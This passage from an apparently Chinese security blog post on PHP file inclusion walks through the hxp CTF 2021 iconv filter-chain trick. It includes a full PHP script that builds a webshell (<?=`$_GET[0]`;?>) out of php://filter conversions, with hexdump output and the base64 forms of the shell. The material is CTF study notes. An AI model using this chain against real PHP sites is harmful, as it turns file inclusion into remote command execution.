+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$url = &quot;php://filter/&quot;;</span><br><span class="line"></span><br><span class="line">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class="line"></span><br><span class="line">$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;     //我们这里简单使用 `data://` 来模拟文件内容读取。</span><br><span class="line">var_dump(file_get_contents($url));</span><br><span class="line"></span><br><span class="line">// hexdump:</span><br><span class="line">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 1b 24 29 43  |string(18) &quot;.$)C|</span><br><span class="line">// 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 22 0a  |aaaaaaaaaaaaaa&quot;.|</span><br></pre></td></tr></table></figure>
+<p>而 c 之前的非法字符，我们只需要利用 decode+incode 去除即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$url = &quot;php://filter/&quot;;</span><br><span class="line">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class="line">$url .= &quot;|convert.base64-decode|convert.base64-encode&quot;;</span><br><span class="line">$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;</span><br><span class="line">var_dump(file_get_contents($url));</span><br><span class="line"></span><br><span class="line">// hexdump</span><br><span class="line">// 00000000  73 74 72 69 6e 67 28 31  32 29 20 22 43 61 61 61  |string(12) &quot;Caaa|</span><br><span class="line">// 00000010  61 61 61 61 61 61 61 61  22 0a                    |aaaaaaaa&quot;.|</span><br></pre></td></tr></table></figure>
+<p>前置知识结束，我们开始构造 payload：</p>
+<p>由于 <code>&lt;</code>  在 base64 是非法字符，我们无法直接构造 <code>&lt;?php</code>  的形式，但我们可以构造 <code>&lt;?php</code> base64 encode 过后的编码，在使用 base64decode 还原即可正常包含</p>
+<p>构造 <code>&lt;</code>  我们可以生成 PAxxxxx 的编码，解码过后我们就可以生成 &lt;，我们接下来要做的就是能找到可以通过编码转换生成我们需要的字符，但后面也可能生成垃圾字符，我们只需要 decode+incode 就可以去除</p>
+<p>我们最后的 webshell 长这样： <code>PD89YCRfR0VUWzBdYDs7Pz4=</code>  是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[0]\`;;?&gt;</span><br></pre></td></tr></table></figure>
+<p>编码后的结果，两个；；的原因是一个；的 base64  <code>PD89YCRfR0VUWzBdYDs/Pg==</code>  中间有个 /，通过编码转换不好找的这个字符</p>
+<p>其实我发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[0]`; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>你也可以加个空格，这样也不会有 \， <code>PD89YCRfR0VUWzBdYDsgPz4=</code></p>
+<p>最终我们的脚本长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;;</span><br><span class="line">$conversions = array(</span><br><span class="line">    &#x27;R&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;,</span><br><span class="line">    &#x27;B&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;,</span><br><span class="line">    &#x27;C&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;,</span><br><span class="line">    &#x27;8&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class="line">    &#x27;9&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;,</span><br><span class="line">    &#x27;f&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;,</span><br><span class="line">    &#x27;s&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;,</span><br><span class="line">    &#x27;z&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;,</span><br><span class="line">    &#x27;U&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;,</span><br><span class="line">    &#x27;P&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;,</span><br><span class="line">    &#x27;V&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;,</span><br><span class="line">    &#x27;0&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;,</span><br><span class="line">    &#x27;Y&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;,</span><br><span class="line">    &#x27;W&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;,</span><br><span class="line">    &#x27;d&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;,</span><br><span class="line">    &#x27;D&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;,</span><br><span class="line">    &#x27;7&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;,</span><br><span class="line">    &#x27;4&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$filters = &quot;convert.base64-encode|&quot;;</span><br><span class="line"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="line">$filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class="line"></span><br><span class="line">foreach (str_split(strrev($base64_payload)) as $c) &#123;</span><br><span class="line">    $filters .= $conversions[$c] . &quot;|&quot;;</span><br><span class="line">    $filters .= &quot;convert.base64-decode|&quot;;</span><br><span class="line">    $filters .= &quot;convert.base64-encode|&quot;;</span><br><span class="line">    $filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$filters .= &quot;convert.base64-decode&quot;;</span><br><span class="line"></span><br><span class="line">$final_payload = &quot;php://filter/&#123;$filters&#125;/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class="line"></span><br><span class="line">// echo $final_payload;</span><br><span class="line">var_dump(file_get_contents($final_payload));</span><br><span class="line"></span><br><span class="line">// hexdump</span><br><span class="line">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 3c 3f 3d 60  |string(18) &quot;&lt;?=`|</span><br><span class="line">// 00000010  24 5f 47 45 54 5b 30 5d  60 3b 3b 3f 3e 18 22 0a  |$_GET[0]`;;?&gt;.&quot;.|</span><br></pre></td></tr></table></figure>
+<p><code>convert.iconv.UTF8.UTF7</code>  将等号转换为字母。之所以使用这个的原因是 exp 作者遇到过有时候等号会让  <code>convert.base64-decode</code>  过滤器解析失败的情况，可以使用 iconv 从 UTF8 转换到 UTF7 ，会把字符串中的任何等号变成一些 base64 。</p>
+<p>我们可以知道对于这种方法来说，其实文件内容并不重要，但至少得有内容，而且一般读取有内容的文件并不是大问题，所以我们可以简单尝试利用  <code>/etc/passwd</code> :</p>
+<p>后面还有一些天书一样的解释，我实在…</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM5NS8=">https://tttang.com/archive/1395/</span></p>
+<p>还有一种神仙解法，先挖坑～</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM4NC8=">hxp CTF 2021 - A New Novel LFI - 跳跳糖 (tttang.com)</span></p>
+<p>实话实说，都是我做不出来的解法</p>
+<p>我也就做做 16 年的 ctf 罢了</p>
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-11-05 16:44:29" itemprop="dateModified" datetime="2022-11-05T16:44:29+08:00">2022-11-05</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="John Doe Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="John Doe PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2022/05/17/yuque/include/" title="file include">http://example.com/2022/05/17/yuque/include/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/04/16/Upload/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclx29mstj20zk0m8hdt.jpg" title="File upload">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> web安全</span>
+  <h3>File upload</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/05/17/include/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipesng5oej20zk0m87d4.jpg" title="file include">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> web安全</span>
+  <h3>file include</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#file-include"><span class="toc-number">1.</span> <span class="toc-text"> file include</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.</span> <span class="toc-text"> PHP 伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1file%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.0.1.</span> <span class="toc-text"> 1.file 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2phpfilter"><span class="toc-number">1.1.0.2.</span> <span class="toc-text"> 2.php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3phpinput"><span class="toc-number">1.1.0.3.</span> <span class="toc-text"> 3.php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4zipbzip2-zlib"><span class="toc-number">1.1.0.4.</span> <span class="toc-text"> 4.zip:&#x2F;&#x2F;,bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#41-zip"><span class="toc-number">1.1.0.4.1.</span> <span class="toc-text"> 4.1 zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#42-bzip2"><span class="toc-number">1.1.0.4.2.</span> <span class="toc-text"> 4.2 bzip2:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#43-zlib"><span class="toc-number">1.1.0.4.3.</span> <span class="toc-text"> 4.3 zlib:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5data"><span class="toc-number">1.1.0.5.</span> <span class="toc-text"> 5.data:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%A2%98%E7%9B%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 一些小题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cgi-fast-cgiphp-fpm"><span class="toc-number">1.2.</span> <span class="toc-text"> CGI、FAST CGI，PHP FPM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.</span> <span class="toc-text"> 日志包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.</span> <span class="toc-text"> session 包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E9%81%93ctf%E5%85%B3%E4%BA%8Esession%E5%8C%85%E5%90%AB%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">1.4.0.1.</span> <span class="toc-text"> 一道 CTF 关于 session 包含的题目</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.</span> <span class="toc-text"> 临时文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.6.</span> <span class="toc-text"> SSH 文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%85%E5%90%ABprocselfenviron"><span class="toc-number">1.7.</span> <span class="toc-text"> 包含 &#x2F; PROC&#x2F;SELF&#x2F;ENVIRON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpinfo%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.8.</span> <span class="toc-text"> phpinfo 文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lfiphp7-collapse"><span class="toc-number">1.9.</span> <span class="toc-text"> LFI+php7 collapse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E4%B8%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.10.</span> <span class="toc-text"> docker 中文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%A4%9A%E7%BA%A7%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%BB%95%E8%BF%87require_once"><span class="toc-number">1.11.</span> <span class="toc-text"> 通过多级软链接绕过 require_once</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hxp-ctf"><span class="toc-number">1.12.</span> <span class="toc-text"> hxp ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#the-end-of-lfi"><span class="toc-number">1.12.1.</span> <span class="toc-text"> the end of LFI</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/03/16/yuque/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li><a href="/2022/04/16/yuque/Upload/" rel="bookmark" title="File upload">File upload</a></li><li><a href="/2022/05/17/include/" rel="bookmark" title="file include">file include</a></li><li class="active"><a href="/2022/05/17/yuque/include/" rel="bookmark" title="file include">file include</a></li><li><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li><li><a href="/2022/05/27/yuque/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li><li><a href="/2022/06/27/SSRF/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/2022/06/27/yuque/SSRF/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/2022/08/16/Unserialize/" rel="bookmark" title="unserialize">unserialize</a></li><li><a href="/2022/08/16/yuque/Unserialize/" rel="bookmark" title="unserialize">unserialize</a></li><li><a href="/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/" rel="bookmark" title="JWT">JWT</a></li><li><a href="/2022/11/17/yuque/JWT%20%E5%9F%BA%E7%A1%80/" rel="bookmark" title="JWT">JWT</a></li><li><a href="/2022/11/27/CDN/" rel="bookmark" title="CDN&DNS">CDN&DNS</a></li><li><a href="/2022/11/27/Docker%E9%80%83%E9%80%B8/" rel="bookmark" title="docker逃逸&capabilities">docker逃逸&capabilities</a></li><li><a href="/2022/11/27/yuque/CDN/" rel="bookmark" title="CDN&DNS">CDN&DNS</a></li><li><a href="/2022/11/27/yuque/Docker%E9%80%83%E9%80%B8/" rel="bookmark" title="docker逃逸&capabilities">docker逃逸&capabilities</a></li><li><a href="/2022/12/27/SSTI/" rel="bookmark" title="SSTI">SSTI</a></li><li><a href="/2022/12/27/yuque/SSTI/" rel="bookmark" title="SSTI">SSTI</a></li><li><a href="/2022/12/31/webshell/" rel="bookmark" title="webshell">webshell</a></li><li><a href="/2022/12/31/yuque/webshell/" rel="bookmark" title="webshell">webshell</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="John Doe"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">John Doe</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">68</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">4</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/04/16/Upload/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/05/17/include/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
+</div>
+
+    <span><a href="/2022/11/01/%E6%B1%87%E7%BC%96/" title="汇编">汇编</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/" title="about me">about me</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/05/yuque/Docker/" title="docker">docker</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/11/27/yuque/Docker%E9%80%83%E9%80%B8/" title="docker逃逸&amp;capabilities">docker逃逸&capabilities</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/12/31/yuque/webshell/" title="webshell">webshell</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/" title="JWT">JWT</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%86%85%E7%BD%91/" title="In 内网">内网</a>
+</div>
+
+    <span><a href="/2022/12/25/yuque/%E5%86%85%E7%BD%91/" title="内网渗透">内网渗透</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/08/16/Unserialize/" title="unserialize">unserialize</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/05/17/include/" title="file include">file include</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/05/17/yuque/include/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
